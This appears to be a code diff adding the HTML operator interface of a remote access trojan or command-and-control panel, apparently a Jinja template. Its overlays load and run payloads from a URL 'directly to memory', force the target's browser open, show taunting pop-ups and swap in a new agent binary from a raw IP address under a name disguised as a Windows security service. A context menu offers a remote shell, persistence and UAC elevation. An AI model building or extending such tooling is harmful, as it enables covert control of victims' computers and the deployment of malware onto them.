+                style="background: rgba(139, 92, 246, 0.1); color: var(--accent-primary); border: 1px solid rgba(139, 92, 246, 0.2);">
+                <i class="ph-bold ph-download-simple"></i>
+            </div>
+            <h2 style="color: var(--text-primary); margin-bottom: 8px; font-weight: 600;">Advanced Loader</h2>
+            <p style="color: var(--text-secondary); font-size: 0.95rem;">Execute payload from URL or upload a file
+                directly to memory</p>
+            <div style="margin-bottom: 15px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">Direct
+                    URL</label>
+                <div class="lock-input-wrap">
+                    <input type="text" id="loader-url" placeholder="http://example.com/payload.exe" autocomplete="off"
+                        style="background: var(--bg-deep); border: 1px solid var(--border-subtle); color: var(--text-primary); border-radius: 8px; padding: 12px 16px;">
+                </div>
+            </div>
+            <div style="margin-bottom: 24px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">Or
+                    Upload File</label>
+                <input type="file" id="loader-file" class="custom-file-input"
+                    style="width: 100%; color: var(--text-secondary); background: var(--bg-deep); padding: 10px; border-radius: 8px; border: 1px dashed var(--border-subtle); cursor: pointer;">
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 15px;">
+                <button id="loader-submit-btn" class="auth-submit"
+                    style="flex: 1; border-radius: 8px; background: var(--accent-primary); border: none; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); color: #fff;">
+                    <i class="ph ph-rocket-launch"></i>
+                    <span style="font-weight: 600;">Execute</span>
+                </button>
+                <button id="loader-cancel-btn" class="auth-submit custom-cancel-btn"
+                    style="flex: 1; border-radius: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-subtle);">
+                    <i class="ph ph-x"></i>
+                    <span style="font-weight: 600;">Cancel</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ OPEN URL OVERLAY ═══════════════════ -->
+    <div id="url-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card"
+            style="box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-subtle); background: var(--bg-surface); backdrop-filter: blur(8px);">
+            <div class="lock-icon"
+                style="background: rgba(139, 92, 246, 0.1); color: var(--accent-primary); border: 1px solid rgba(139, 92, 246, 0.2);">
+                <i class="ph-bold ph-globe"></i>
+            </div>
+            <h2 style="color: var(--text-primary); margin-bottom: 8px; font-weight: 600;">Open URL</h2>
+            <p style="color: var(--text-secondary); font-size: 0.95rem;">Force the target's default browser to open a
+                specific website</p>
+            <div style="margin-bottom: 24px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">Target
+                    URL</label>
+                <div class="lock-input-wrap">
+                    <input type="text" id="url-input" placeholder="https://www.youtube.com/" autocomplete="off"
+                        style="background: var(--bg-deep); border: 1px solid var(--border-subtle); color: var(--text-primary); border-radius: 8px; padding: 12px 16px;">
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 15px;">
+                <button id="url-submit-btn" class="auth-submit"
+                    style="flex: 1; border-radius: 8px; background: var(--accent-primary); border: none; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); color: #fff;">
+                    <i class="ph ph-paper-plane-right"></i>
+                    <span style="font-weight: 600;">Open</span>
+                </button>
+                <button id="url-cancel-btn" class="auth-submit custom-cancel-btn"
+                    style="flex: 1; border-radius: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-subtle);">
+                    <i class="ph ph-x"></i>
+                    <span style="font-weight: 600;">Cancel</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ MESSAGE BOX OVERLAY ═══════════════════ -->
+    <div id="msg-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card"
+            style="box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-subtle); background: var(--bg-surface); backdrop-filter: blur(8px);">
+            <div class="lock-icon"
+                style="background: rgba(139, 92, 246, 0.1); color: var(--accent-primary); border: 1px solid rgba(139, 92, 246, 0.2);">
+                <i class="ph-bold ph-chat-centered-text"></i>
+            </div>
+            <h2 style="color: var(--text-primary); margin-bottom: 8px; font-weight: 600;">Message Box</h2>
+            <p style="color: var(--text-secondary); font-size: 0.95rem;">Display a pop-up alert box directly on the
+                target's screen</p>
+            <div style="margin-bottom: 24px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">Message
+                    Content</label>
+                <div class="lock-input-wrap">
+                    <input type="text" id="msg-input" placeholder="You have been compromised." autocomplete="off"
+                        style="background: var(--bg-deep); border: 1px solid var(--border-subtle); color: var(--text-primary); border-radius: 8px; padding: 12px 16px;">
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 15px;">
+                <button id="msg-submit-btn" class="auth-submit"
+                    style="flex: 1; border-radius: 8px; background: var(--accent-primary); border: none; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); color: #fff;">
+                    <i class="ph ph-paper-plane-right"></i>
+                    <span style="font-weight: 600;">Send</span>
+                </button>
+                <button id="msg-cancel-btn" class="auth-submit custom-cancel-btn"
+                    style="flex: 1; border-radius: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-subtle);">
+                    <i class="ph ph-x"></i>
+                    <span style="font-weight: 600;">Cancel</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ AGENT UPGRADER OVERLAY ═══════════════════ -->
+    <div id="upgrader-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card"
+            style="box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-subtle); background: var(--bg-surface); backdrop-filter: blur(8px);">
+            <div class="lock-icon"
+                style="background: rgba(139, 92, 246, 0.1); color: var(--accent-primary); border: 1px solid rgba(139, 92, 246, 0.2);">
+                <i class="ph-bold ph-arrows-clockwise"></i>
+            </div>
+            <h2 style="color: var(--text-primary); margin-bottom: 8px; font-weight: 600;">Agent Upgrader</h2>
+            <p style="color: var(--text-secondary); font-size: 0.95rem;">Download updated agent binary from URL, replace
+                current executable, and restart agent</p>
+            <div style="margin-bottom: 24px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">New
+                    Agent Binary URL</label>
+                <div class="lock-input-wrap">
+                    <input type="text" id="upgrader-url-input"
+                        placeholder="http://150.136.246.12:33875/static/SecurityHealthService.exe" autocomplete="off"
+                        style="background: var(--bg-deep); border: 1px solid var(--border-subtle); color: var(--text-primary); border-radius: 8px; padding: 12px 16px;">
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 15px;">
+                <button id="upgrader-submit-btn" class="auth-submit"
+                    style="flex: 1; border-radius: 8px; background: var(--accent-primary); border: none; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); color: #fff;">
+                    <i class="ph ph-arrows-clockwise"></i>
+                    <span style="font-weight: 600;">Upgrade Agent</span>
+                </button>
+                <button id="upgrader-cancel-btn" class="auth-submit custom-cancel-btn"
+                    style="flex: 1; border-radius: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-subtle);">
+                    <i class="ph ph-x"></i>
+                    <span style="font-weight: 600;">Cancel</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ NOTIFICATION PANEL ═══════════════════ -->
+    <div id="notification-panel" class="notif-panel" style="display:none;">
+        <div class="notif-header">
+            <h3><i class="ph ph-bell-ringing"></i> Notifications</h3>
+            <button id="clear-notifs" class="notif-clear">Clear all</button>
+        </div>
+        <div id="notif-list" class="notif-list">
+            <div class="notif-empty">No notifications</div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ CONTEXT MENU ═══════════════════ -->
+    <div id="context-menu" class="ctx-menu" style="display:none;">
+        <button class="ctx-item" data-action="shell"><i class="ph ph-terminal"></i> Open Shell</button>
+        <button class="ctx-item" data-action="info"><i class="ph ph-info"></i> System Info</button>
+        <div class="ctx-divider"></div>
+        <button class="ctx-item" data-action="persist"><i class="ph ph-anchor"></i> Persistence</button>
+        <button class="ctx-item" data-action="elevate"><i class="ph ph-shield-warning"></i> Request UAC
+            Elevation</button>
+
+        <div class="ctx-divider"></div>
+        <button class="ctx-item danger" data-action="kill"><i class="ph ph-skull"></i> Kill Agent</button>
+    </div>
+
+    <!-- ═══════════════════ CUSTOM CYBER MODAL SYSTEM ═══════════════════ -->
+    <div id="custom-modal-backdrop" class="c-modal-backdrop" style="display: none;">
+        <div class="c-modal-card" id="c-modal-card">
+            <div class="c-modal-header">
+                <div class="c-modal-title-wrap">
+                    <div class="c-modal-icon-badge" id="c-modal-icon-badge">
+                        <i id="c-modal-icon" class="ph-bold ph-pencil-simple"></i>
+                    </div>
+                    <div>
+                        <h3 id="c-modal-title" class="c-modal-title-text">Confirm Action</h3>
+                        <span id="c-modal-subtitle" class="c-modal-subtitle-text">System Action</span>
+                    </div>
+                </div>
+                <button id="c-modal-close-btn" class="c-modal-close-btn" title="Close">&times;</button>
+            </div>
+            <div class="c-modal-body">
+                <p id="c-modal-message" class="c-modal-message-text">Please confirm this action:</p>
+                <div id="c-modal-input-wrap" class="c-modal-input-wrap" style="display: none;">
+                    <input type="text" id="c-modal-input" class="c-modal-input-field" placeholder="Enter value..."
+                        autocomplete="off" spellcheck="false">
+                </div>
+                <div id="c-modal-totp-wrap" class="c-modal-input-wrap" style="display: none; margin-top: 15px;">
+                    <label
+                        style="display: flex; align-items: center; gap: 6px; font-size: 0.8rem; font-weight: 600; color: #a855f7; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">
+                        <i class="ph ph-shield-check"></i> Google Authenticator 2FA Code
+                    </label>
+                    <input type="text" id="c-modal-totp-input" class="c-modal-input-field" placeholder="" maxlength="6"
+                        autocomplete="off" spellcheck="false"
+                        style="letter-spacing: 4px; font-weight: bold; text-align: center; font-size: 1.1rem; border-color: rgba(168, 85, 247, 0.5);">
+                    <div id="c-modal-totp-error"
+                        style="color: #f87171; font-size: 0.8rem; margin-top: 6px; display: none; font-weight: 500;">
+                    </div>
+                </div>
+            </div>
+            <div class="c-modal-footer">
+                <button id="c-modal-cancel-btn" class="f-action-pill secondary">Cancel</button>
+                <button id="c-modal-confirm-btn" class="f-action-pill primary">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div id="toast-container" class="toast-container"></div>
+</div>
+{% endblock %}
